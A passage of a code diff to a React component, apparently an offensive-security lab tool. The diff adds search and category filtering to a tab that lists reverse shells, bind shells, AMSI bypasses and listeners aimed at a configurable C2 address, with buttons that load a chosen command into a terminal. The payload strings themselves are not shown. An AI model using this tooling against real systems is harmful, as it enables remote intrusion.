   const [histIdx,  setHistIdx]  = useState(-1);
   const [draft,    setDraft]    = useState("");
   const [libCat,   setLibCat]   = useState(0);
   const [libSearch,setLibSearch]= useState("");
-  const [shellCat, setShellCat] = useState("All");
+  const [shellCat,    setShellCat]    = useState("All");
+  const [shellSearch, setShellSearch] = useState("");
 
   // Fuzzer state
   const [fuzzTpl,  setFuzzTpl]  = useState("cat FUZZ");
@@ -834,7 +917,12 @@ export default function MainLab() {
   const shells = buildShells(attIp, attPort);
   const listeners = buildListeners(attPort);
   const shellCats = ["All",...Array.from(new Set(shells.map(s=>s.cat)))];
-  const filteredShells = shellCat==="All" ? shells : shells.filter(s=>s.cat===shellCat);
+  const filteredShells = shells.filter(s=>{
+    const catOk = shellCat==="All" || s.cat===shellCat;
+    const q = shellSearch.toLowerCase().trim();
+    const srchOk = !q || s.name.toLowerCase().includes(q) || s.cmd.toLowerCase().includes(q) || s.cat.toLowerCase().includes(q);
+    return catOk && srchOk;
+  });
   const libEntry = PAYLOAD_LIBRARY[libCat]!;
   const libFiltered = libSearch.trim()
     ? PAYLOAD_LIBRARY.flatMap(c=>c.p.filter(p=>p.toLowerCase().includes(libSearch.toLowerCase())).map(p=>({p,col:c.col,cat:c.cat})))
@@ -1069,40 +1157,89 @@ export default function MainLab() {
 
   // ── SHELLS ────────────────────────────────────────────
   const tabShells = () => (
-    <div className="flex-1 flex flex-col p-3 gap-3 overflow-y-auto">
+    <div className="flex-1 flex flex-col p-3 gap-2 overflow-hidden">
+      {/* Search */}
+      <input
+        value={shellSearch} onChange={e=>{setShellSearch(e.target.value);setShellCat("All");}}
+        className="w-full bg-black border border-zinc-800 px-2 py-1.5 text-[11px] text-zinc-300 focus:outline-none focus:border-red-700 shrink-0 font-mono"
+        placeholder="Search shells, payloads, categories…" spellCheck={false}/>
+      {/* Category pills */}
       <div className="flex flex-wrap gap-1 shrink-0">
-        {shellCats.map(c=>(
-          <button key={c} onClick={()=>setShellCat(c)}
-            className={`text-[9px] px-2 py-0.5 border uppercase transition-colors ${shellCat===c?"border-red-600 text-red-400 bg-red-950/20":"border-zinc-800 text-zinc-600 hover:border-zinc-600"}`}>
-            {c}
-          </button>
-        ))}
+        {shellCats.map(c=>{
+          const catColor: Record<string,string> = {
+            AMSI:"border-blue-700 text-blue-400 bg-blue-950/20",
+            MEMFD:"border-cyan-700 text-cyan-400 bg-cyan-950/20",
+            TTY:"border-yellow-700 text-yellow-400 bg-yellow-950/20",
+            BIND:"border-orange-700 text-orange-400 bg-orange-950/20",
+          };
+          const activeClass = catColor[c] ?? "border-red-600 text-red-400 bg-red-950/20";
+          return (
+            <button key={c} onClick={()=>{setShellCat(c);setShellSearch("");}}
+              className={`text-[9px] px-2 py-0.5 border uppercase transition-colors ${shellCat===c && !shellSearch ? activeClass : "border-zinc-800 text-zinc-600 hover:border-zinc-600"}`}>
+              {c}
+              {c!=="All" && <span className="ml-0.5 opacity-50">({shells.filter(s=>s.cat===c).length})</span>}
+            </button>
+          );
+        })}
       </div>
-      <div className="flex flex-col gap-1 flex-1">
-        {filteredShells.map((rs,i)=>(
-          <div key={i} className="border border-zinc-800 bg-black px-2 py-1.5">
-            <div className="flex justify-between items-center">
-              <div className="flex items-center gap-2">
-                <span className="text-[9px] text-zinc-700 border border-zinc-800 px-1 uppercase">{rs.cat}</span>
-                <span className="text-[11px] text-zinc-300">{rs.name}</span>
+      {/* Results count */}
+      <div className="text-[9px] text-zinc-700 shrink-0">
+        {filteredShells.length} of {shells.length} shells
+        {shellSearch && <span className="text-zinc-600"> matching <span className="text-zinc-400">"{shellSearch}"</span></span>}
+        {!shellSearch && shellCat!=="All" && <span className="text-zinc-600"> in <span className="text-zinc-400">{shellCat}</span></span>}
+        {" · "}C2: <span className={attIp?"text-purple-400":"text-zinc-700"}>{attIp||"no C2 IP"}</span>:{attPort}
+      </div>
+      {/* Shell list */}
+      <div className="flex flex-col gap-0.5 flex-1 overflow-y-auto min-h-0">
+        {filteredShells.length===0 && (
+          <div className="text-zinc-700 text-xs p-3">No shells match — try a different filter.</div>
+        )}
+        {filteredShells.map((rs,i)=>{
+          const catCol: Record<string,string> = {
+            AMSI:"text-blue-400 border-blue-900",
+            MEMFD:"text-cyan-400 border-cyan-900",
+            TTY:"text-yellow-400 border-yellow-900",
+            BIND:"text-orange-400 border-orange-900",
+            Bash:"text-lime-400 border-lime-900",
+            NC:"text-green-400 border-green-900",
+            Python:"text-sky-400 border-sky-900",
+            PS:"text-blue-300 border-blue-900",
+            SSL:"text-violet-400 border-violet-900",
+          };
+          const cc = catCol[rs.cat] ?? "text-zinc-500 border-zinc-800";
+          return (
+            <div key={i} className="border border-zinc-800 hover:border-zinc-700 bg-black px-2 py-1.5 group">
+              <div className="flex justify-between items-center">
+                <div className="flex items-center gap-2">
+                  <span className={`text-[8px] border px-1 uppercase font-bold shrink-0 ${cc}`}>{rs.cat}</span>
+                  <span className="text-[11px] text-zinc-300 group-hover:text-white transition-colors">{rs.name}</span>
+                </div>
+                <div className="flex gap-2 shrink-0 opacity-0 group-hover:opacity-100 transition-opacity">
+                  <button onClick={()=>{setCmd(rs.cmd);setTab("TERMINAL");}}
+                    className="text-[10px] text-zinc-600 hover:text-lime-400 uppercase">USE</button>
+                  <button onClick={()=>copy(rs.cmd,`rs${i}`)}
+                    className={`text-[10px] uppercase ${copyId===`rs${i}`?"text-green-400":"text-zinc-600 hover:text-red-400"}`}>
+                    {copyId===`rs${i}`?"OK":"CPY"}
+                  </button>
+                </div>
               </div>
-              <div className="flex gap-2">
-                <button onClick={()=>{setCmd(rs.cmd);setTab("TERMINAL");}} className="text-[10px] text-zinc-600 hover:text-lime-400 uppercase">USE</button>
-                <button onClick={()=>copy(rs.cmd,`rs${i}`)} className={`text-[10px] uppercase ${copyId===`rs${i}`?"text-green-400":"text-zinc-600 hover:text-red-400"}`}>{copyId===`rs${i}`?"COPIED":"COPY"}</button>
-              </div>
+              <div className="text-[9px] text-zinc-600 font-mono truncate mt-0.5 group-hover:text-zinc-400 transition-colors">{rs.cmd}</div>
             </div>
-            <div className="text-[9px] text-zinc-700 font-mono truncate mt-0.5">{rs.cmd}</div>
-          </div>
-        ))}
+          );
+        })}
       </div>
-      <div className="shrink-0">
-        <div className="text-[10px] text-red-500 uppercase mb-1.5">Listeners</div>
-        <div className="space-y-1">
+      {/* Listeners */}
+      <div className="shrink-0 border-t border-zinc-900 pt-2">
+        <div className="text-[10px] text-red-500 uppercase mb-1.5 tracking-wider">Listeners</div>
+        <div className="space-y-0.5">
           {listeners.map((l,i)=>(
-            <div key={i} className="border border-zinc-800 bg-black px-2 py-1.5 flex items-center gap-2">
-              <span className="text-[11px] text-zinc-400 w-28 shrink-0">{l.name}</span>
+            <div key={i} className="border border-zinc-800 bg-black px-2 py-1 flex items-center gap-2 group hover:border-zinc-700">
+              <span className="text-[10px] text-zinc-400 w-28 shrink-0 group-hover:text-zinc-300">{l.name}</span>
               <span className="text-[9px] text-amber-400 font-mono truncate flex-1">{l.cmd}</span>
-              <button onClick={()=>copy(l.cmd,`lst${i}`)} className={`text-[10px] shrink-0 uppercase ${copyId===`lst${i}`?"text-green-400":"text-zinc-600 hover:text-red-400"}`}>{copyId===`lst${i}`?"COPIED":"COPY"}</button>
+              <button onClick={()=>copy(l.cmd,`lst${i}`)}
+                className={`text-[9px] shrink-0 uppercase opacity-0 group-hover:opacity-100 transition-opacity ${copyId===`lst${i}`?"text-green-400":"text-zinc-600 hover:text-red-400"}`}>
+                {copyId===`lst${i}`?"OK":"CPY"}
+              </button>
             </div>
           ))}
         </div>
